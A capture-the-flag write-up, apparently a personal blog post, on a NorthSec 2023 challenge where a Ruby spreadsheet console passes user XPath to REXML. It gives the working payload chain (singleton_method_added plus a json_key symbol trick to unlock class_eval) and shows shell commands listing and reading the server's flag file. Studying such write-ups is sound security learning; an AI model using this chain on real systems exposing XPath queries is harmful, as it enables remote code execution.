---
title: Ruby XPath Injection (NorthSec 2023)
date: 2022-05-23 16:23:00
layout: post
---

Once again this year I participated in the [NorthSec CTF](https://nsec.io/competition).
This is one of my favourite infosec events of the year. Today I wanted to talk about a challenge I worked on called The Great Processor by [@becojo](https://twitter.com/becojo). I worked on this challenge with my teammate Saba.

This challenge presented itself initially as a command-line spreadsheet tool but had some
very interesting internals. 

## A Brief Tour of the UI

The app, XSpreadsheet, was accessible via `nc` and begins with a prompt like this:

```
XSpreadsheet 23.129-3348.1
Type help() for help.

>
```

When you ask for the help, it gives you some starting points for how to navigate and
explore your spreadsheet. Unfortunately I don't have this as I didn't save it during
the CTF. To summarize:

* `render` will show the spreadsheet
* `select` allows you to select a range to perform an operation on
* `json_parse`, `json_key`, and `json_get` allow you to work with JSON objects
* `export_xml` shows you the XML state file
* `set` sets the content of cells within the state
* `source` shows the source code of the application

Calling the `render` function, it returns something like (not the real spreadsheet):

```
+----+----+----+
| 70 | 50 | 56 |
+----+----+----+
| 75 | 50 | 57 |
+----+----+----+
| 65 | 50 | 57 |
+----+----+----+
```

This is where I missed the first flag. If you were to decode the provided values as ASCII
then you would have received a 1-point flag.

## Reading the Source

I then asked it for its source code. It responded with a Ruby application. To save space, only the parts directly relevant
to the solution are reproduced where needed below. 

The full challenge is available in [this Gist](https://gist.github.com/JackMc/e92d37247fe91aaac6e16dbc61577896). 

```ruby
class State < Struct.new(:cells, :selection)
  def initialize
    state = REXML::Functions.json_parse(File.read("state.json"))

    @cells = state[:@cells].map do |key, value|
      [REXML::Functions.json_parse(key.to_s), value]
    end.to_h
  end

  def to_xml
    ...
  end

  def query(query)
    ...
  end

  def clear(nodes)
    ...
  end

  def set(value, nodes)
    ...
  end

  def render(cells = @cells)
    ...
  end
end
```

This constructor parses a file `state.json` consisting of a JSON object with a single array keyed as `@cells`. 
An example (not the real one) is reproduced below:

```json
{
    "@cells": {
        "[0, 0]": 70,
        "[0, 1]": 75,
        "[0, 2]": 65,
        "[1, 0]": 50,
        "[1, 1]": 50,
        "[1, 2]": 50,
        "[2, 0]": 56,
        "[2, 1]": 57,
        "[2, 2]": 57
    }
}
```

This is then turned into a hash of `(x_coord,y_coord) => val`, and placed in an instance variable 
called `@cells`. Another interesting note is that this parsing is done using the method
`REXML::Functions.json_parse`, which bares a strong resemblance to the function we were
able to call inside the XSpreadsheet console. 

Before moving onwards, we noted that the `State` class reads from `@cells` to perform
the `to_xml` operation (used by the user-accessible functions as we'll see later), but
never writes back to it in the `set` function (used by the user-accessible `set` function).
This means, in reality, we can't actually modify the spreadsheet.

Moving downwards in the app, we see that it modifies the existing `REXML::Functions` module.

```ruby
module REXML::Functions
  def self.export_xml
    STATE.to_xml
  end

  def self.import_xml(*_)
    # importing xml is dangerous. we'll do it later.
    "todo: import_xml"
  end

  def self.json_parse(value)
    # at least json is safe to parse
    JSON.parse(value, symbolize_names: true)
  end

  def self.json_get(json, key)
    key = string(key)
    json[key] or json[key.to_sym]
  end

  def self.json_key(json, value)
    json.key(value)
  end

   def self.select(x1, y1, x2, y2)
    ...
  end

  def self.clear(nodes = nil)
    STATE.clear(nodes)
  end

  def self.set(value, nodes = nil)
    STATE.set(value, nodes)
  end

  def self.render
    STATE.render
  end

  def self.source
    @source ||= File.read(__FILE__).split("__#{'END'}__").first
  end

  def self.help
    @help ||= DATA.read
  end
end
```

These functions all line up spookily well with the functions we're able to call from the console, 
and there's nowhere where the app actually allowlists the functions that are allowed to be called.
This made my "Ruby magic senses" start tingling, and made me curious how `REXML::Functions` works.
But first, let's talk about the actual logic that drives the console:

```ruby
STATE = State.new

puts "XSpreadsheet 23.129-3348.1"
puts "Type help() for help."
puts

loop do
  print "> "

  begin
    query = gets
    exit if query.nil?
  rescue Interrupt
    exit
  end

  begin
    puts STATE.query(query)
  rescue Exception => e
    warn(e)
    puts "error"
  end

  puts
end
```

This logic simply asks for user input, and calls the `query` method on the 
`STATE` object with that user input repeatedly until an interrupt occurs 
(control-C is pressed) or the query is blank.

This brings us back to the `STATE` object. Its query method looks like:

```ruby
def query(query)
  doc = REXML::Document.new(to_xml)
  REXML::XPath.match(doc, query)
end
```

This uses `REXML::XPath` to query a `REXML::Document` object. The Document is created
through the `to_xml` method:

```ruby
def to_xml
  cells = @cells.map do |(col, row), value|
    "  <cell col=\"#{col.to_i}\" row=\"#{row.to_i}\">#{value.to_i}</cell>"
  end

  "<cells>\n#{cells.join("\n")}\n</cells>"
end
```

So we know that somehow `REXML::XPath` knows how to call the functions defined in the `REXML::Functions`
mixin above and use them to manipulate the document produced by `to_xml`. 

## What's an XPath?

I wasn't super familiar with XPath before starting this challenge. I knew it was something like the
language used by `document.querySelector` in the web browser, but for any XML document, but that was 
about it. 

It turns out XPath is a very feature-rich language for querying XML documents, defined across three 
RFCs that are very dry and not really relevant to this challenge. I will however mention a couple of
relevant pieces of the language: 

* `//cell` will give us all tags with the name `cell`, and `//cell[col>=1]` will give us all cells where the `col` attribute is greater than or equal to 1. 
* XPath has some built-in functions such as `count`, `id`, `starts-with`. These can be called like `//cell[starts-with(col, "1")]`, or by themselves like `starts-with("boop", "booooop")`.

## Digging into the REXML Source Code

Learning that somehow we were registering XPath functions sent me down a big rabbit hole of learning exactly
how the REXML XPath parser works. To save you that experience, I'll only mention the relevant parts below. There was 
however one very funny comment in the file `lib/rexml/parsers/xpathparser.rb`:

```
# You don't want to use this class.  Really.  Use XPath, which is a wrapper
# for this class.  Believe me.  You don't want to poke around in here.
# There is strange, dark magic at work in this code.  Beware.  Go back!  Go
# back while you still can!
```

After reading this code, I can very much agree that there is dark magic at work. After tracing the code down from the
`REXML::XPath.query` function, I arrived at this line in `lib/rexml/xpath_parser.rb`:

```
Functions.context = target_context
return Functions.send(func_name, *args)
```

`func_name` is the function name provided in our XPath query, and `args` are the arguments we provide. To those familiar 
with Ruby security, the usage of `send` here on any object with a user-provided input causes a Very Bad Time (TM). It can 
very trivially be used to achieve arbitrary command execution:

```ruby
irb(main):006:0> Module.send(:class_eval, 'system("curl google.com")')
<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="http://www.google.com/">here</A>.
</BODY></HTML>
=> true
```

At this point, I was very confused how this wasn't a 0-day in REXML. Sure, giving a user the ability to specify an arbitrary
XPath query definitely isn't the most advisable thing, most folks would not expect it to lead the arbitrary code execution. 
I tried this in the XSpreadsheet console:

```
> class_eval("system('ls /')")

>
```

Well...that didn't look like it worked how we wanted it to. At this point we opened up the `REXML::Functions` source code and found this
interesting logic overriding the `send` function:

```ruby
def Functions::send(name, *args)
  if @@available_functions[name.to_sym]
    super
  else
    # TODO: Maybe, this is not XPath spec behavior.
    # This behavior must be reconsidered.
    XPath.match(@@context[:node], name.to_s)
  end
end
```

This only allows us to actually call a method ("send" a method in Ruby/Smalltalk lingo) if it's inside the `@@available_functions` class 
variable. That would explain why we can't just call `class_eval`, there's an allowlist. How does that work? I searched the file for 
`@@available_functions` and found the following:

```ruby
module REXML
  module Functions
  INTERNAL_METHODS = [
    :namespace_context,
    :namespace_context=,
    :variables,
    :variables=,
    :context=,
    :get_namespace,
    :send,
  ]
  class << self
    def singleton_method_added(name)
      unless INTERNAL_METHODS.include?(name)
        @@available_functions[name] = true
      end
    end
  end
  ...
```

`singleton_method_added` is a special class method that gets called every time a new
class method ("singleton" method in Ruby) is defined. This implementation adds every
method that is defined and isn't in the `INTERNAL_METHODS` list into the `@@available_functions`
list. 

The next obvious question is, well, why isn't `class_eval` in this list? To answer that,
we can use the `source_location` method to determine where in the source code `class_eval` is defined:

```
# Example with a normal `REXML::Functions` function
irb(main):002:0> REXML::Functions.method(:name)
=> #<Method: REXML::Functions.name(node_set=...) /home/jackmc/.rubies/ruby-3.2.2/lib/ruby/gems/3.2.0/gems/rexml-3.2.5/lib/rexml/functions.rb:80>
irb(main):003:0> REXML::Functions.method(:name).source_location
=>
["/home/jackmc/.rubies/ruby-3.2.2/lib/ruby/gems/3.2.0/gems/rexml-3.2.5/lib/rexml/functions.rb",
 80]
irb(main):004:0> REXML::Functions.method(:class_eval)
=> #<Method: #<Class:REXML::Functions>(Module)#class_eval(*)>
irb(main):003:0> REXML::Functions.method(:class_eval).source_location
=> nil
```

The fact that the `class_eval` function returns `nil` for its `source_location` unlike `name` indicates that it is defined
natively by Ruby in its C source code. It is in fact defined on `Module` itself, the parent class of all modules. Since this is
defined before the `singleton_method_defined` function above, even though `class_eval` isn't in the `INTERNAL_METHODS` denylist, it doesn't
get added to the `@@available_functions` list. 

This leads us to the natural question of, well, what is in that list? To figure this out we can just query `REXML::Functions` for its default
list:

```
irb(main):011:0> REXML::Functions.class_variable_get(:@@available_functions)
=>
{:singleton_method_added=>true,
 :text=>true,
 :last=>true,
 :position=>true,
 :count=>true,
 :id=>true,
 :local_name=>true,
 ...24 other functions}
```

There's a lot of functions in this list. But, interestingly, `singleton_method_added` is 
one of them. This is a strange behaviour of Ruby: the `singleton_method_added` first gets
called about its own definition. This means that from our XPath console, we should be able to 
call it. This seems like a behaviour we can exploit.

## Exploitation

The trouble is, if we use the remote version of the console, we won't be able to tell
if anything changes (since `singleton_method_added` doesn't return anything other than the name
of the function). So let's tweak the code of the loop a little bit and run it locally. We'll change:

```ruby
puts STATE.query(query)
```

To:

```ruby
puts STATE.query(query)
puts "FUNCS"
puts REXML::Functions.class_variable_get(:@@available_functions)
```

Trying this out we get:

```
> singleton_method_added("class_eval")
class_eval
true
FUNCS
{:singleton_method_added=>true, :text=>true, ..., "class_eval"=>true}
```

Awesome, `class_eval` is at the end of the list! We should be able to call it:

```
> class_eval("system('ls /')")

>
```

Nope, looks like it got filtered. At this point we realized that `class_eval` is in the available 
functions Hash as a String whereas everything else is a Symbol. This presents a unique challenge
as there isn't really a concept of symbols in XPath. After a little bit of thinking, we remembered the
`parse_json` method and its definition:

```ruby
def self.json_parse(value)
  # at least json is safe to parse
  JSON.parse(value, symbolize_names: true)
end
```

This calls `JSON.parse` which is a pretty standard JSON parsing function in Ruby, but passes in 
`symbolize_keys` which takes all the String keys from an object and turns them into symbols. 
So if we could parse a JSON object and somehow get back its key, we could create a symbol. 
Luckily enough, we have a function that will do exactly that, `json_key`:

```ruby
def self.json_key(json, value)
  json.key(value)
end
```

The `key` method on a Ruby Hash returns the associated value for a given key. You can think of this
as a reverse key-value lookup. For `json = {a: "b"}`, `json_key(json, "b")` would return `:a`. 
This means that we can do:

```
json_key(json_parse('{"class_eval": "a"}'), "a")
```

And get back the symbol `:class_eval`. Trying this in our console yields...ambiguous results:

```
> json_key(json_parse('{"class_eval": "a"}'), "a")
class_eval
```

I'm assuming that this is because REXML calls `to_s` on its result before printing it, and the string 
conversion of a symbol is just the symbol's name.

But, combining this with our knowledge of `singleton_method_added`, we can do:

```
> singleton_method_added(json_key(json_parse('{"class_eval": "a"}'), "a"))
> singleton_method_added(json_key(json_parse('{"class_eval": "a"}'), "a"))
class_eval
true
FUNCS
{:singleton_method_added=>true, :text=>true, :last=>true, :position=>true, :count=>true, :id=>true, :local_name=>true, :namespace_uri=>true, :name=>true, :string=>true, :string_value=>true, :concat=>true, :starts_with=>true, :contains=>true, :substring_before=>true, :substring_after=>true, :substring=>true, :string_length=>true, :normalize_space=>true, :translate=>true, :boolean=>true, :not=>true, :true=>true, :false=>true, :lang=>true, :compare_language=>true, :number=>true, :sum=>true, :floor=>true, :ceiling=>true, :round=>true, :processing_instruction=>true, :export_xml=>true, :import_xml=>true, :json_parse=>true, :json_get=>true, :json_key=>true, :select=>true, :clear=>true, :set=>true, :render=>true, :source=>true, :help=>true, "class_eval"=>true, :class_eval=>true}
```

Which adds `class_eval` as a symbol to the `@@available_functions` Hash. Yay! Let's try it out:

```
> class_eval('system("curl google.com")')
<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="http://www.google.com/">here</A>.
</BODY></HTML>
true
```

Amazing. Using this on the server to navigate through the directory structures, we can find the flag:

```
> singleton_method_added(json_key(json_parse('{"class_eval": "a"}'), "a"))
true
> class_eval('system("ls")')
bin
boot
challenge.rb
dev
etc
flag_here_f75047c21a96c2eXXXXXXXXXX
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
state.json
sys
tmp
usr
var
true

> class_eval('system("cat flag_here_f75047c21a96c2e487XXXXXXXXX")')
FLAG-0b8eca2374fXXXXXXXXXXX
true
```

## Conclusion

Submitting this, we got 6 points for our team. This was a really fun challenge and I learned a lot. Thanks again to @becojo, my teammate Saba, and
the whole IDK CTF team.
